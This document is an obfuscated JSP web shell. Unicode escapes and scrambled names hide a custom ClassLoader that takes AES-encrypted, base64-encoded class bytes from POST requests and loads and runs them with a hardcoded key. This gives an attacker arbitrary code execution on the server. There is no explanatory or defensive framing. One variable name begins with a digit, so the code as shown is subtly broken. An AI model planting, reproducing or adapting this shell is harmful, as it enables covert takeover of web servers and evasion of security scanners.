<%@page import="sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random" %>
<%!
    class V7FT3kaTV extends \u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 {
        V7FT3kaTV(\u0043l\u0061\u0073\u0073\u004c\u006f\u0061\u0064\u0065\u0072 tas9erN6hmNARUb) {
            super(tas9erN6hmNARUb);
        }
        public Class NrMhPleNG(byte[] Z24GErPop) {
            return super.d\uuuuuuuuu0065fineClass(Z24GErPop,0,Z24GErPop.length);
        }
    }
%><%
    Random ig8WU42V3 = new Random();
    int maFs7HB3M = ig8WU42V3.nextInt(1234);
    int KmWWR9z6T = ig8WU42V3.nextInt(5678);
    int 5ObtXGQg7 = ig8WU42V3.nextInt(1357);
    int tas9erf77PWeabN = ig8WU42V3.nextInt(2468);
    String[] tas9erq8VmhpLC6 = new String[]{"A", "P", "B", "O", "C", "S", "D", "T"};
    String tas9erzFXeC2i8M = tas9erq8VmhpLC6[1] + tas9erq8VmhpLC6[3] + tas9erq8VmhpLC6[5] + tas9erq8VmhpLC6[7];
    if (request.getMethod().equals(tas9erzFXeC2i8M)) {
        String tas9er14WVcJiG1 = new String(new B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer("MGRmZWIyMzNkZTA0MGRlNQ=="));
        session.setAttribute("u", tas9er14WVcJiG1);
        Cipher tas9erq98fNz0vs = Cipher.getInstance("AES");
        tas9erq98fNz0vs.init(((maFs7HB3M * KmWWR9z6T + 5ObtXGQg7 - tas9erf77PWeabN) * 0) + 3 - 1, new SecretKeySpec(tas9er14WVcJiG1.getBytes(), "AES"));
        new V7FT3kaTV(this.\u0067\u0065t\u0043\u006c\u0061\u0073\u0073().\u0067\u0065t\u0043\u006c\u0061\u0073\u0073Loader()).NrMhPleNG(tas9erq98fNz0vs.doFinal(new sun.misc.B\u0041\u0053\u0045\u0036\u0034\u0044\u0065\u0063\u006f\u0064\u0065\u0072().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
    }
%>